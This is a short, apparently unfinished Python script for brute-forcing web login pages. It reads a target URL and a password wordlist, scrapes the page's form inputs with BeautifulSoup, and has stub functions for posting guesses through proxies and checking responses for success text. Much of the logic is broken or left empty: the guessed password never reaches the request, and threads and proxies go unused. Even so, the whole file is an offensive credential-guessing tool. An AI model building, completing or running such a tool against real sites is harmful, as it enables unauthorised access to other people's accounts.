import threading
import time
import requests
import os
import bs4 as bs

target = "" # target: http://example.com/login
threads = 10 # thread amm
correct_text = "" #text that shows up if success
incorrect_text = "" # the text that shows up if fail
has_csrf = False # if csrf
posting = True # if post
data = "" # post data, or get
which = "" #required, if either correct or incorrect checking
wordlist_loc = ""
auto_inputs = []





def check_if_success(passwd, response):
    if which == "correct":
        if correct_text in response:
            return passwd
    else:
        if incorrect_text in response:
            pass


def attack(proxy, passwd):
    if proxy == "none":
        pass
    else:
        #stuff with proxy
        if posting:
            req = requests.post(target, data=data)
            check_if_success(passwd, req.text)

def collect_proxies():
    pass

def auto():
    inputs = []
    login_page = requests.get(target)
    soup = bs.BeautifulSoup(login_page.text,'lxml')
    form = soup.find('form')
    form = str(form).split('<')

    for line in form:

        if 'input' in line:
            #print(str(line))
            auto_inputs.append("<" + line.strip())
    print(auto_inputs)


    #messy code for creating form data
    form_data = {}
    for input in auto_inputs:
        input = input.split(" ")
        thename = ""
        thevalue = ""
        for i in range(len(input)):

            if "name=" in input[i]:
                name_thing = input[i].split(input[i][input[i].find("=")+1])
                thename = name_thing[1]
            if "value=" in input[i]:
                value_thing = input[i].split(input[i][input[i].find("=")+1])
                thevalue = value_thing[1]
        form_data[thename] = thevalue
        print(form_data)

target = input("target: ")
wordlist_loc = input("wordlist: ")
isauto = input("(a)uto or (m)anual: ")
if isauto == "a":
    auto()
